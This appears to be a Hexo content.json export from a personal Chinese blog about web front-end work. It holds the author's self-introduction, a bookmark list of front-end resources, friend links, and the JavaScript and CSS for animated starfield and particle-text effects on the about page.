{"meta":{"title":"Ivan's Blog","subtitle":"Web前端 & 极客 & 渗透","description":"Thinking as a Geek","author":"Ivan","url":"http://www.yfgeek.com"},"pages":[{"title":"","date":"2017-10-27T03:16:12.052Z","updated":"2017-10-27T03:16:12.052Z","comments":true,"path":"about/index.html","permalink":"http://www.yfgeek.com/about/index.html","excerpt":"","text":"关于我 location.href = 'http://www.yfgeek.com'; console.log('$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\\n$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\\n$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\\n$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$*; $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\\n$$$$$$$$$$$$$$$$$$$$$$$$$$$$$; $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\\n**; $$$$$$$$$$$$$$$$! $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\\n $$$$$$$$$$$$$$; $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\\n ;$$$$$$$$$$$$ $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\\n $$$$$$$$$* $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\\n$ ;$$$$$$* ;$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\\n$$* $$$$$ $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\\n$$$$; !$$ $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\\n$$$$$$ ;$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\\n$$$$$$$o ;$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\\n$$$$$$$$$ ;$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\\n$$$$$$$$$$$ ;$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$! o$$$$\\n$$$$$$$$$$$$; *$$$$$$$$$$$$$$$$o ;$$$$\\n$$$$$$$$$$$$$$ $$$$$$$ $$$$\\n$$$$$$$$$$$$$$$$ $$$$$$$ $$$$\\n$$$$$$$$$$$$$$$$ $$$$$$$ $$$$\\n$$$$$$$$$$$$$$$$ ;$$$$$$! ;o$$$$$$$\\n$$$$$$$$$$$$$$$$ $$$$$$$ $$$$$$$$$$$$$$$$$$$$$$$$$\\n$$$$$$$$$$$$$$$$* $$$$$$$ o$$$$$$$$$$$$$$$$$$$$$$$$\\n$$$$$$$$$$$$$$$$$ $$$$$$$ $$$$$$$$$$$$$$$$$$$$$$$$\\n$$$$$$$$$$$$$$$$$ $$$$$$$ $$$$$$$$$$$$$$$$$$$$$$$$\\n$$$$$$$$$$$$$$$$$ ;$$$$$$$ $$$$$$\\n$$$$$$$$$$$$$$$$$ ;$$$$$$$ $$$$$$\\n$$$$$$$$$$$$$$$$$! ;;$$$$$$$ ;$$$$$\\n$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ $$$$$\\n$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ ;!$$$$$$$$$$\\n$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$! $$$$$$$$$$$$$$$$$$$$$$$\\n$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ $$$$$$$$$$$$$$$$$$$$$$$\\n$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ *$$$$$$$$$$$$$$$$$$$$$$\\n$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ ;$$$$$$$$$$$$$$$$$$$$$$\\n$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ $$$$$$$$$$$$$$$$$$$$$$\\n$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ $$$$$$$$$$$$$$$$$$$$$$\\n$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ $$$$$$$$$$$$$$$$$$$$$$\\n$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ $$$$$$$$$$$$$$$$$$$$$$\\n$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ $$$$$$$$$$$$$$$$$$$$$');"},{"title":"关于","date":"2016-09-25T16:27:35.000Z","updated":"2017-10-26T12:59:55.529Z","comments":true,"path":"aboutme.html","permalink":"http://www.yfgeek.com/aboutme.html","excerpt":"","text":"关于我 一凡，Ivan 本科 自动化 研究生 计算机科学技术 人在 英国 来自 北京 University of Birmingham 自幼喜爱计算机技术 极客 爱钻研 爱学习 爱好Web前端 (React粉丝) 爱好渗透测试 和前端相关的美工，但渣 从来不用收藏夹，一直背网址 空格档 Github的star各种人的狂魔 Cnbeta党 Mac党，中度果粉 知乎狂魔 曾经的OIer，算法小渣渣 曾经混过百度空间、饭否、远景论坛 爱做饭爱蹭饭 联系方式 微信：yifani 邮件：yifanb@gmail.com （接受邮件，一直会回复） 知乎：点击进入…"},{"title":"前端收藏夹","date":"2016-07-30T16:27:35.000Z","updated":"2016-08-17T11:53:28.000Z","comments":true,"path":"f2e.html","permalink":"http://www.yfgeek.com/f2e.html","excerpt":"","text":"这是一个真正的前端收藏夹，由于前端技术更新较快，好资源太多，在这里做个收藏夹，只为方便自己。 前端CDN CDNBEE 模板素材 easyicon 阿里巴巴iconfont (荐) Fontello 稀土区 优设 pixabay (荐) 500px 壁纸wallhaven (荐) jquery 模板 HTML5 UP 控制面板 网站 Github热度排名 imweb前端社区 前端乱炖 鑫空间 AlloyTeam Github 我Star的项目 娱乐 前端 JSer 装逼手册 工具 工具武装的前端开发工程师 在Mac平台配置你的开发环境 前端工具箱chrome插件"},{"title":"友情链接","date":"2016-09-25T16:27:35.000Z","updated":"2017-10-26T12:59:55.987Z","comments":true,"path":"link.html","permalink":"http://www.yfgeek.com/link.html","excerpt":"","text":"友情链接百度空间好友 Fuxiaohei 幽虫博客 胡戈戈 safe121 Panda熊猫 lzlhoho 52abc/xinzhixiang Monyer 生活好友 Wayne Yan Echowxsy rjgeek jazzyin"},{"title":"","date":"2017-10-26T12:59:55.989Z","updated":"2017-10-26T12:59:55.989Z","comments":false,"path":"tags/index.html","permalink":"http://www.yfgeek.com/tags/index.html","excerpt":"","text":""},{"title":"","date":"2017-10-26T12:59:55.528Z","updated":"2017-10-26T12:59:55.528Z","comments":true,"path":"about/scripts/words.js","permalink":"http://www.yfgeek.com/about/scripts/words.js","excerpt":"","text":""},{"title":"","date":"2017-10-26T12:59:55.528Z","updated":"2017-10-26T12:59:55.528Z","comments":true,"path":"about/scripts/universe.js","permalink":"http://www.yfgeek.com/about/scripts/universe.js","excerpt":"","text":"window.requestAnimationFrame = window.requestAnimationFrame || window.mozRequestAnimationFrame || window.webkitRequestAnimationFrame || window.msRequestAnimationFrame; var starDensity = .216; var speedCoeff = .05; var width; var height; var starCount; var circleRadius; var circleCenter; var first = true; var giantColor = '180,184,240'; var starColor = '226,225,142'; var cometColor = '226,225,224'; var canva = document.getElementById('universe'); var stars = []; var universe; windowResizeHandler(); window.addEventListener('resize', windowResizeHandler, false); createUniverse(); function createUniverse() { universe = canva.getContext('2d'); for (var i = 0; i < starCount; i++) { stars[i] = new Star(); stars[i].reset(); } draw(); } function draw() { universe.clearRect(0, 0, width, height); var starsLength = stars.length; for (var i = 0; i < starsLength; i++) { var star = stars[i]; star.move(); star.fadeIn(); star.fadeOut(); star.draw(); } window.requestAnimationFrame(draw); } function Star() { this.reset = function() { this.giant = getProbability(3); this.comet = this.giant || first ? false : getProbability(10); this.x = getRandInterval(0, width - 10); this.y = getRandInterval(0, height); this.r = getRandInterval(1.1, 2.6); this.dx = getRandInterval(speedCoeff, 6 * speedCoeff) + (this.comet + 1 - 1) * speedCoeff * getRandInterval(50, 120) + speedCoeff * 2; this.dy = -getRandInterval(speedCoeff, 6 * speedCoeff) - (this.comet + 1 - 1) * speedCoeff * getRandInterval(50, 120); this.fadingOut = null; this.fadingIn = true; this.opacity = 0; this.opacityTresh = getRandInterval(.2, 1 - (this.comet + 1 - 1) * .4); this.do = getRandInterval(0.0005, 0.002) + (this.comet + 1 - 1) * .001; }; this.fadeIn = function() { if (this.fadingIn) { this.fadingIn = this.opacity > this.opacityTresh ? false : true; this.opacity += this.do; } }; this.fadeOut = function() { if (this.fadingOut) { this.fadingOut = this.opacity < 0 ? false : true; this.opacity -= this.do / 2; if (this.x > width || this.y < 0) { this.fadingOut = false; this.reset(); } } }; this.draw = function() { universe.beginPath(); if (this.giant) { universe.fillStyle = 'rgba(' + giantColor + ',' + this.opacity + ')'; universe.arc(this.x, this.y, 2, 0, 2 * Math.PI, false); } else if (this.comet) { universe.fillStyle = 'rgba(' + cometColor + ',' + this.opacity + ')'; universe.arc(this.x, this.y, 1.5, 0, 2 * Math.PI, false); //comet tail for (var i = 0; i < 30; i++) { universe.fillStyle = 'rgba(' + cometColor + ',' + (this.opacity - (this.opacity / 20) * i) + ')'; universe.rect(this.x - this.dx / 4 * i, this.y - this.dy / 4 * i - 2, 2, 2); universe.fill(); } } else { universe.fillStyle = 'rgba(' + starColor + ',' + this.opacity + ')'; universe.rect(this.x, this.y, this.r, this.r); } universe.closePath(); universe.fill(); }; this.move = function() { this.x += this.dx; this.y += this.dy; if (this.fadingOut === false) { this.reset(); } if (this.x > width - (width / 4) || this.y < 0) { this.fadingOut = true; } }; (function() { setTimeout(function() { first = false; }, 50) })() } function getProbability(percents) { return ((Math.floor(Math.random() * 1000) + 1) < percents * 10); } function getRandInterval(min, max) { return (Math.random() * (max - min) + min); } function windowResizeHandler() { width = window.innerWidth; height = window.innerHeight; starCount = width * starDensity; // console.log(starCount) circleRadius = (width > height ? height / 2 : width / 2); circleCenter = { x: width / 2, y: height / 2 } canva.setAttribute('width', width); canva.setAttribute('height', height); }"},{"title":"","date":"2017-10-26T12:59:55.529Z","updated":"2017-10-26T12:59:55.529Z","comments":true,"path":"about/styles/main.css","permalink":"http://www.yfgeek.com/about/styles/main.css","excerpt":"","text":"html, body { padding: 0px; margin: 0px; width: 100%; height: 100%; position: fixed; } body { display: -webkit-box; display: -ms-flexbox; display: flex; -webkit-box-pack: center; -ms-flex-pack: center; justify-content: center; -webkit-box-align: center; -ms-flex-align: center; align-items: center; -webkit-filter: contrast(120%); filter: contrast(120%); background-color: black; } .container { width: 100%; height: 100%; background-image: -webkit-radial-gradient(70% 120% 1600px, #212750 10%, #020409 100%); background-image: radial-gradient(1600px at 70% 120%, #212750 10%, #020409 100%); } .content { width: inherit; height: inherit; } #universe { width: 100%; height: 100%; } #footerContent { font-family: sans-serif; font-size: 110%; color: rgba(200, 220, 255, 0.3); width: 100%; position: fixed; bottom: 0px; padding: 20px; text-align: center; z-index: 20; } #footer { position: absolute; bottom: 0px; height: 300px; width: 100%; } #scene { height: 100%; position: absolute; left: 50%; margin-left: -800px; } a { text-decoration: none; color: #c8dcff; opacity: .4; -webkit-transition: opacity .4s ease; transition: opacity .4s ease; } a:hover { opacity: 1; } /*box*/ #box { color: #fff; position: absolute; bottom: 30%; left: 50%; margin-left: -96px; z-index: 100; transform: rotate(-12deg); -webkit-transform: rotate(-12deg); font-size: 12px; } .txt { color: transparent; text-shadow: #fff 0 0 10px; -webkit-transition: text-shadow 2s cubic-bezier(0, 1, 0, 1); transition: text-shadow 2s cubic-bezier(0, 1, 0, 1); } @-moz-document url-prefix() { .txt { text-shadow: #fff 0 0 20px; } } #canvas { margin: 200px auto; } .github { position: absolute; top: 10px; right: 10px; width: 20px; } /*# sourceMappingURL=data:application/json;charset=utf8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbIm1haW4uc2NzcyIsIm1haW4uY3NzIl0sIm5hbWVzIjpbXSwibWFwcGluZ3MiOiJBQUFBOztFQUVJLGFBQWE7RUFDYixZQUFZO0VBQ1osWUFBWTtFQUNaLGFBQWE7RUFDYixnQkFBZ0I7Q0FDbkI7O0FBRUQ7RUFDSSxxQkFBcUI7RUFFckIscUJBQXFCO0VBQ3JCLGNBQWM7RUFDZCx5QkFBeUI7RUFFekIsc0JBQXNCO0VBQ3RCLHdCQUF3QjtFQUN4QiwwQkFBMEI7RUFFMUIsdUJBQXVCO0VBQ3ZCLG9CQUFvQjtFQUNwQiwrQkFBd0I7RUFDeEIsdUJBQWdCO0VBQ2hCLHdCQUF3QjtDQUMzQjs7QUFFRDtFQUNJLFlBQVk7RUFDWixhQUFhO0VBQ2Isc0ZBQWlDO0VBQWpDLGlGQUFpQztDQUVwQzs7QUFFRDtFQUNJLGVBQWU7RUFDZixnQkFBZ0I7Q0FDbkI7O0FBRUQ7RUFDSSxZQUFZO0VBQ1osYUFBYTtDQUNoQjs7QUFFRDtFQUNJLHdCQUF3QjtFQUN4QixnQkFBZ0I7RUFDaEIsZ0NBQVc7RUFDWCxZQUFZO0VBQ1osZ0JBQWdCO0VBQ2hCLFlBQVk7RUFDWixjQUFjO0VBQ2QsbUJBQW1CO0VBQ25CLFlBQVk7Q0FDZjs7QUFFRDtFQUNJLG1CQUFtQjtFQUNuQixZQUFZO0VBQ1osY0FBYztFQUNkLFlBQVk7Q0FDZjs7QUFFRDtFQUNJLGFBQWE7RUFDYixtQkFBbUI7RUFDbkIsVUFBVTtFQUNWLG9CQUFvQjtDQUN2Qjs7QUFFRDtFQUNJLHNCQUFzQjtFQUN0QixlQUFXO0VBQ1gsWUFBWTtFQUNaLHFDQUFxQztFQUNyQyw2QkFBNkI7Q0FDaEM7O0FBRUQ7RUFDSSxXQUFXO0NBQ2Q7O0FBRUQsT0FBTztBQUVQO0VBQ0ksWUFBWTtFQUNaLG1CQUFtQjtFQUNuQixZQUFZO0VBQ1osVUFBVTtFQUNWLG1CQUFtQjtFQUNuQixhQUFhO0VBQ2IsMEJBQWlCO0VBQ2pCLGtDQUF5QjtFQUN6QixnQkFBZ0I7Q0FDbkI7O0FBRUQ7RUFDSSxtQkFBVztFQUNYLDJCQUEyQjtFQUMzQiw0REFBdUM7RUFBdkMsb0RBQXVDO0NBQzFDOztBQUVEO0VBQ0k7SUFDSSwyQkFBMkI7R0FDOUI7Q0NESjs7QURJRDtFQUNJLG1CQUFtQjtDQUN0Qjs7QUFFRDtFQUNJLG1CQUFtQjtFQUNuQixVQUFVO0VBQ1YsWUFBWTtFQUNaLFlBQVk7Q0FDZiIsImZpbGUiOiJtYWluLmNzcyIsInNvdXJjZXNDb250ZW50IjpbImh0bWwsXG5ib2R5IHtcbiAgICBwYWRkaW5nOiAwcHg7XG4gICAgbWFyZ2luOiAwcHg7XG4gICAgd2lkdGg6IDEwMCU7XG4gICAgaGVpZ2h0OiAxMDAlO1xuICAgIHBvc2l0aW9uOiBmaXhlZDtcbn1cblxuYm9keSB7XG4gICAgZGlzcGxheTogLXdlYmtpdC1ib3g7XG4gICAgZGlzcGxheTogLXdlYmtpdC1mbGV4O1xuICAgIGRpc3BsYXk6IC1tcy1mbGV4Ym94O1xuICAgIGRpc3BsYXk6IGZsZXg7XG4gICAgLXdlYmtpdC1ib3gtcGFjazogY2VudGVyO1xuICAgIC13ZWJraXQtanVzdGlmeS1jb250ZW50OiBjZW50ZXI7XG4gICAgLW1zLWZsZXgtcGFjazogY2VudGVyO1xuICAgIGp1c3RpZnktY29udGVudDogY2VudGVyO1xuICAgIC13ZWJraXQtYm94LWFsaWduOiBjZW50ZXI7XG4gICAgLXdlYmtpdC1hbGlnbi1pdGVtczogY2VudGVyO1xuICAgIC1tcy1mbGV4LWFsaWduOiBjZW50ZXI7XG4gICAgYWxpZ24taXRlbXM6IGNlbnRlcjtcbiAgICAtd2Via2l0LWZpbHRlcjogY29udHJhc3QoMTIwJSk7XG4gICAgZmlsdGVyOiBjb250cmFzdCgxMjAlKTtcbiAgICBiYWNrZ3JvdW5kLWNvbG9yOiBibGFjaztcbn1cblxuLmNvbnRhaW5lciB7XG4gICAgd2lkdGg6IDEwMCU7XG4gICAgaGVpZ2h0OiAxMDAlO1xuICAgIGJhY2tncm91bmQtaW1hZ2U6IHJhZGlhbC1ncmFkaWVudCgxNjAwcHggYXQgNzAlIDEyMCUsIHJnYmEoMzMsIDM5LCA4MCwgMSkgMTAlLCAjMDIwNDA5IDEwMCUpO1xuXG59XG5cbi5jb250ZW50IHtcbiAgICB3aWR0aDogaW5oZXJpdDtcbiAgICBoZWlnaHQ6IGluaGVyaXQ7XG59XG5cbiN1bml2ZXJzZSB7XG4gICAgd2lkdGg6IDEwMCU7XG4gICAgaGVpZ2h0OiAxMDAlO1xufVxuXG4jZm9vdGVyQ29udGVudCB7XG4gICAgZm9udC1mYW1pbHk6IHNhbnMtc2VyaWY7XG4gICAgZm9udC1zaXplOiAxMTAlO1xuICAgIGNvbG9yOiByZ2JhKDIwMCwgMjIwLCAyNTUsIC4zKTtcbiAgICB3aWR0aDogMTAwJTtcbiAgICBwb3NpdGlvbjogZml4ZWQ7XG4gICAgYm90dG9tOiAwcHg7XG4gICAgcGFkZGluZzogMjBweDtcbiAgICB0ZXh0LWFsaWduOiBjZW50ZXI7XG4gICAgei1pbmRleDogMjA7XG59XG5cbiNmb290ZXIge1xuICAgIHBvc2l0aW9uOiBhYnNvbHV0ZTtcbiAgICBib3R0b206IDBweDtcbiAgICBoZWlnaHQ6IDMwMHB4O1xuICAgIHdpZHRoOiAxMDAlO1xufVxuXG4jc2NlbmUge1xuICAgIGhlaWdodDogMTAwJTtcbiAgICBwb3NpdGlvbjogYWJzb2x1dGU7XG4gICAgbGVmdDogNTAlO1xuICAgIG1hcmdpbi1sZWZ0OiAtODAwcHg7XG59XG5cbmEge1xuICAgIHRleHQtZGVjb3JhdGlvbjogbm9uZTtcbiAgICBjb2xvcjogcmdiYSgyMDAsIDIyMCwgMjU1LCAxKTtcbiAgICBvcGFjaXR5OiAuNDtcbiAgICAtd2Via2l0LXRyYW5zaXRpb246IG9wYWNpdHkgLjRzIGVhc2U7XG4gICAgdHJhbnNpdGlvbjogb3BhY2l0eSAuNHMgZWFzZTtcbn1cblxuYTpob3ZlciB7XG4gICAgb3BhY2l0eTogMTtcbn1cblxuLypib3gqL1xuXG4jYm94IHtcbiAgICBjb2xvcjogI2ZmZjtcbiAgICBwb3NpdGlvbjogYWJzb2x1dGU7XG4gICAgYm90dG9tOiAzMCU7XG4gICAgbGVmdDogNTAlO1xuICAgIG1hcmdpbi1sZWZ0OiAtOTZweDtcbiAgICB6LWluZGV4OiAxMDA7XG4gICAgdHJhbnNmb3JtOiByb3RhdGUoLTEyZGVnKTtcbiAgICAtd2Via2l0LXRyYW5zZm9ybTogcm90YXRlKC0xMmRlZyk7XG4gICAgZm9udC1zaXplOiAxMnB4O1xufVxuXG4udHh0IHtcbiAgICBjb2xvcjogaHNsYSgwLCAwJSwgMCUsIDApO1xuICAgIHRleHQtc2hhZG93OiAjZmZmIDAgMCAxMHB4O1xuICAgIHRyYW5zaXRpb246IHRleHQtc2hhZG93IDJzIGN1YmljLWJlemllcigwLCAxLCAwLCAxKTtcbn1cblxuQC1tb3otZG9jdW1lbnQgdXJsLXByZWZpeCgpIHtcbiAgICAudHh0IHtcbiAgICAgICAgdGV4dC1zaGFkb3c6ICNmZmYgMCAwIDIwcHg7XG4gICAgfVxufVxuXG4jY2FudmFze1xuICAgIG1hcmdpbjogMjAwcHggYXV0bztcbn1cblxuLmdpdGh1YntcbiAgICBwb3NpdGlvbjogYWJzb2x1dGU7XG4gICAgdG9wOiAxMHB4O1xuICAgIHJpZ2h0OiAxMHB4O1xuICAgIHdpZHRoOiAyMHB4O1xufSIsImh0bWwsXG5ib2R5IHtcbiAgcGFkZGluZzogMHB4O1xuICBtYXJnaW46IDBweDtcbiAgd2lkdGg6IDEwMCU7XG4gIGhlaWdodDogMTAwJTtcbiAgcG9zaXRpb246IGZpeGVkO1xufVxuXG5ib2R5IHtcbiAgZGlzcGxheTogLXdlYmtpdC1ib3g7XG4gIGRpc3BsYXk6IC13ZWJraXQtZmxleDtcbiAgZGlzcGxheTogLW1zLWZsZXhib3g7XG4gIGRpc3BsYXk6IGZsZXg7XG4gIC13ZWJraXQtYm94LXBhY2s6IGNlbnRlcjtcbiAgLXdlYmtpdC1qdXN0aWZ5LWNvbnRlbnQ6IGNlbnRlcjtcbiAgLW1zLWZsZXgtcGFjazogY2VudGVyO1xuICBqdXN0aWZ5LWNvbnRlbnQ6IGNlbnRlcjtcbiAgLXdlYmtpdC1ib3gtYWxpZ246IGNlbnRlcjtcbiAgLXdlYmtpdC1hbGlnbi1pdGVtczogY2VudGVyO1xuICAtbXMtZmxleC1hbGlnbjogY2VudGVyO1xuICBhbGlnbi1pdGVtczogY2VudGVyO1xuICAtd2Via2l0LWZpbHRlcjogY29udHJhc3QoMTIwJSk7XG4gIGZpbHRlcjogY29udHJhc3QoMTIwJSk7XG4gIGJhY2tncm91bmQtY29sb3I6IGJsYWNrO1xufVxuXG4uY29udGFpbmVyIHtcbiAgd2lkdGg6IDEwMCU7XG4gIGhlaWdodDogMTAwJTtcbiAgYmFja2dyb3VuZC1pbWFnZTogcmFkaWFsLWdyYWRpZW50KDE2MDBweCBhdCA3MCUgMTIwJSwgIzIxMjc1MCAxMCUsICMwMjA0MDkgMTAwJSk7XG59XG5cbi5jb250ZW50IHtcbiAgd2lkdGg6IGluaGVyaXQ7XG4gIGhlaWdodDogaW5oZXJpdDtcbn1cblxuI3VuaXZlcnNlIHtcbiAgd2lkdGg6IDEwMCU7XG4gIGhlaWdodDogMTAwJTtcbn1cblxuI2Zvb3RlckNvbnRlbnQge1xuICBmb250LWZhbWlseTogc2Fucy1zZXJpZjtcbiAgZm9udC1zaXplOiAxMTAlO1xuICBjb2xvcjogcmdiYSgyMDAsIDIyMCwgMjU1LCAwLjMpO1xuICB3aWR0aDogMTAwJTtcbiAgcG9zaXRpb246IGZpeGVkO1xuICBib3R0b206IDBweDtcbiAgcGFkZGluZzogMjBweDtcbiAgdGV4dC1hbGlnbjogY2VudGVyO1xuICB6LWluZGV4OiAyMDtcbn1cblxuI2Zvb3RlciB7XG4gIHBvc2l0aW9uOiBhYnNvbHV0ZTtcbiAgYm90dG9tOiAwcHg7XG4gIGhlaWdodDogMzAwcHg7XG4gIHdpZHRoOiAxMDAlO1xufVxuXG4jc2NlbmUge1xuICBoZWlnaHQ6IDEwMCU7XG4gIHBvc2l0aW9uOiBhYnNvbHV0ZTtcbiAgbGVmdDogNTAlO1xuICBtYXJnaW4tbGVmdDogLTgwMHB4O1xufVxuXG5hIHtcbiAgdGV4dC1kZWNvcmF0aW9uOiBub25lO1xuICBjb2xvcjogI2M4ZGNmZjtcbiAgb3BhY2l0eTogLjQ7XG4gIC13ZWJraXQtdHJhbnNpdGlvbjogb3BhY2l0eSAuNHMgZWFzZTtcbiAgdHJhbnNpdGlvbjogb3BhY2l0eSAuNHMgZWFzZTtcbn1cblxuYTpob3ZlciB7XG4gIG9wYWNpdHk6IDE7XG59XG5cbi8qYm94Ki9cbiNib3gge1xuICBjb2xvcjogI2ZmZjtcbiAgcG9zaXRpb246IGFic29sdXRlO1xuICBib3R0b206IDMwJTtcbiAgbGVmdDogNTAlO1xuICBtYXJnaW4tbGVmdDogLTk2cHg7XG4gIHotaW5kZXg6IDEwMDtcbiAgdHJhbnNmb3JtOiByb3RhdGUoLTEyZGVnKTtcbiAgLXdlYmtpdC10cmFuc2Zvcm06IHJvdGF0ZSgtMTJkZWcpO1xuICBmb250LXNpemU6IDEycHg7XG59XG5cbi50eHQge1xuICBjb2xvcjogdHJhbnNwYXJlbnQ7XG4gIHRleHQtc2hhZG93OiAjZmZmIDAgMCAxMHB4O1xuICB0cmFuc2l0aW9uOiB0ZXh0LXNoYWRvdyAycyBjdWJpYy1iZXppZXIoMCwgMSwgMCwgMSk7XG59XG5cbkAtbW96LWRvY3VtZW50IHVybC1wcmVmaXgoKSB7XG4gIC50eHQge1xuICAgIHRleHQtc2hhZG93OiAjZmZmIDAgMCAyMHB4O1xuICB9XG59XG5cbiNjYW52YXMge1xuICBtYXJnaW46IDIwMHB4IGF1dG87XG59XG5cbi5naXRodWIge1xuICBwb3NpdGlvbjogYWJzb2x1dGU7XG4gIHRvcDogMTBweDtcbiAgcmlnaHQ6IDEwcHg7XG4gIHdpZHRoOiAyMHB4O1xufVxuIl19 */"},{"title":"","date":"2017-10-26T12:59:55.528Z","updated":"2017-10-26T12:59:55.528Z","comments":true,"path":"about/scripts/main.js","permalink":"http://www.yfgeek.com/about/scripts/main.js","excerpt":"","text":";(function (window) { window.requestAnimationFrame = window.requestAnimationFrame || window.mozRequestAnimationFrame || window.webkitRequestAnimationFrame || window.msRequestAnimationFrame const FRAME_RATE = 60 const PARTICLE_NUM = 2000 const RADIUS = Math.PI * 2 const CANVASWIDTH = 500 const CANVASHEIGHT = 150 const CANVASID = 'canvas' let texts = ['Hello', '我叫一凡', '伯明翰大学', '喜爱计算机', '极客一个', 'Web前端', '渗透测试', '小美工', '爱背网址', '空格党', 'Github狂魔', 'Cnbeta党', 'Mac党 果粉', '知乎狂魔', '曾经的OIer', '爱Linux', '喜欢交友', '欢迎联系我'] let canvas, ctx, particles = [], quiver = true, text = texts[0], textIndex = 0, textSize = 70 function draw () { ctx.clearRect(0, 0, CANVASWIDTH, CANVASHEIGHT) ctx.fillStyle = 'rgb(255, 255, 255)' ctx.textBaseline = 'middle' ctx.fontWeight = 'bold' ctx.font = textSize + 'px \\'SimHei\\', \\'Avenir\\', \\'Helvetica Neue\\', \\'Arial\\', \\'sans-serif\\'' ctx.fillText(text, (CANVASWIDTH - ctx.measureText(text).width) * 0.5, CANVASHEIGHT * 0.5) let imgData = ctx.getImageData(0, 0, CANVASWIDTH, CANVASHEIGHT) ctx.clearRect(0, 0, CANVASWIDTH, CANVASHEIGHT) for (let i = 0, l = particles.length; i < l; i++) { let p = particles[i] p.inText = false } particleText(imgData) window.requestAnimationFrame(draw) } function particleText (imgData) { // 点坐标获取 var pxls = [] for (var w = CANVASWIDTH; w > 0; w -= 3) { for (var h = 0; h < CANVASHEIGHT; h += 3) { var index = (w + h * (CANVASWIDTH)) * 4 if (imgData.data[index] > 1) { pxls.push([w, h]) } } } var count = pxls.length var j = parseInt((particles.length - pxls.length) / 2, 10) j = j < 0 ? 0 : j for (var i = 0; i < pxls.length && j < particles.length; i++, j++) { try { var p = particles[j], X, Y if (quiver) { X = (pxls[i - 1][0]) - (p.px + Math.random() * 10) Y = (pxls[i - 1][1]) - (p.py + Math.random() * 10) } else { X = (pxls[i - 1][0]) - p.px Y = (pxls[i - 1][1]) - p.py } var T = Math.sqrt(X * X + Y * Y) var A = Math.atan2(Y, X) var C = Math.cos(A) var S = Math.sin(A) p.x = p.px + C * T * p.delta p.y = p.py + S * T * p.delta p.px = p.x p.py = p.y p.inText = true p.fadeIn() p.draw(ctx) } catch (e) {} } for (var i = 0; i < particles.length; i++) { var p = particles[i] if (!p.inText) { p.fadeOut() var X = p.mx - p.px var Y = p.my - p.py var T = Math.sqrt(X * X + Y * Y) var A = Math.atan2(Y, X) var C = Math.cos(A) var S = Math.sin(A) p.x = p.px + C * T * p.delta / 2 p.y = p.py + S * T * p.delta / 2 p.px = p.x p.py = p.y p.draw(ctx) } } } function setDimensions () { canvas.width = CANVASWIDTH canvas.height = CANVASHEIGHT canvas.style.position = 'absolute' canvas.style.left = '0px' canvas.style.top = '0px' canvas.style.bottom = '0px' canvas.style.right = '0px' canvas.style.marginTop = window.innerHeight * .15 + 'px' } function event () { document.addEventListener('click', function (e) { textIndex++ if (textIndex >= texts.length) { window.location.href=\"/aboutme.html\"; } text = texts[textIndex] }, false) document.addEventListener('touchstart', function (e) { textIndex++ if (textIndex >= texts.length) { window.location.href=\"/aboutme.html\"; } text = texts[textIndex] }, false) } function init () { canvas = document.getElementById(CANVASID) if (canvas === null || !canvas.getContext) { return } ctx = canvas.getContext('2d') setDimensions() event() for (var i = 0; i < PARTICLE_NUM; i++) { particles[i] = new Particle(canvas) } draw() } class Particle { constructor (canvas) { let spread = canvas.height let size = Math.random() * 1.2 // 速度 this.delta = 0.06 // 现在的位置 this.x = 0 this.y = 0 // 上次的位置 this.px = Math.random() * canvas.width this.py = (canvas.height * 0.5) + ((Math.random() - 0.5) * spread) // 记录点最初的位置 this.mx = this.px this.my = this.py // 点的大小 this.size = size // this.origSize = size // 是否用来显示字 this.inText = false // 透明度相关 this.opacity = 0 this.fadeInRate = 0.05 this.fadeOutRate = 0.03 this.opacityTresh = 0.98 this.fadingOut = true this.fadingIn = true } fadeIn () { this.fadingIn = this.opacity > this.opacityTresh ? false : true if (this.fadingIn) { this.opacity += this.fadeInRate }else { this.opacity = 1 } } fadeOut () { this.fadingOut = this.opacity < 0 ? false : true if (this.fadingOut) { this.opacity -= this.fadeOutRate if (this.opacity < 0) { this.opacity = 0 } }else { this.opacity = 0 } } draw (ctx) { ctx.fillStyle = 'rgba(226,225,142, ' + this.opacity + ')' ctx.beginPath() ctx.arc(this.x, this.y, this.size, 0, RADIUS, true) ctx.closePath() ctx.fill() } } // setTimeout(() => { init() // }, 4000); // mp3.play() 